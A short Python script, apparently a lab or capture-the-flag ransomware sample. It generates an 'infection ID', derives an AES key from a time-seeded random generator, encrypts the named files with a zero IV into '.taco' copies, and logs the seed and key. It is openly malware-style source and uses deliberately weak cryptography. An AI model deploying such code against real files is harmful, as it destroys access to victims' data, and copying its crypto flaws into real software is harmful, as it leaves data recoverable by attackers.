import random, os, logging, time, argparse
import Crypto
from Crypto.Cipher import AES

logger=logging.getLogger(__name__)
logger.setLevel(logging.INFO)
logger.addHandler(logging.StreamHandler())


class AESObject():

    def __init__(self,key,mode=AES.MODE_CBC,IV=16 * '\x00'):
        self.key=key
        self.mode=mode
        self.IV=IV


    def encrypt_file(self, filename,chunksize=64*1024):
        infile=filename
        encryptor = AES.new(self.key, self.mode, IV=self.IV)
        encrypted_data=bytes()
        filesize = os.path.getsize(infile)
        with open(infile,'rb') as fin:
            while True:
                chunk = fin.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                encrypted_data+=encryptor.encrypt(chunk)
        self.fs=filesize
        return encrypted_data

def gen_random_strng(length):
    t=round(time.time(),4)
    random.seed(t)
    logger.info(f'Seed Time:\t\t {t}')
    random_string=""
    picker="0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
    for i in range(0,length):
        random_string+=picker[random.randint(0, 61)]
    return random_string

def gen_infection_id():
    infection_id=gen_random_strng(16)
    logger.info(f'Infection ID:\t\t {infection_id}')
    return infection_id

def execute_infection(in_id,file_list):
    key=gen_random_strng(32)
    logger.info(f'Key:\t\t\t {key}')
    key=str.encode(key)
    aes=AESObject(key)
    for i in file_list:
        outfile=i.split('.')[0]+'_'+in_id+'.taco'
        enc_data=aes.encrypt_file(i)
        with open(outfile,'wb') as f:
            f.write(enc_data)
        logger.info(f'File Written:\t\t {outfile}')
    logger.debug(f'Encrypted Data {enc_data}')
    

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f','--files', nargs='+', help='The files to be encrypted', required=True)
    args=parser.parse_args()
    file_list=args.files
    execute_infection(gen_infection_id(),file_list)


if __name__ == "__main__":
    main()

